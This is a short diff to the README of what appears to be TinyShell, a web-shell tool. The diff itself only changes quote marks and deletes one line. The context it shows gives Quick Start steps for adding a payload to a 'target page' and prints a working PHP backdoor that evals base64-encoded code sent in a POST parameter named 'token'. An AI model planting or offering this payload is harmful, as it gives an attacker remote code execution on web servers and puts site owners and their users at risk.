@@ -62,7 +62,7 @@ TinyShell is based on it's companion project SubShell (https://bitbucket.org/jve
 ## Quick Start
 
 1. Determine a payload
-2. Determine a 'password'
+2. Determine a "password"
 3. Add payload to target page
 4. Enjoy
 
@@ -75,7 +75,6 @@ Password Desired: token
 
 ```
 <?php @eval(base64_decode($_POST['token']));?>
-Payload:
 ```
 
 TinyShell Command Line:
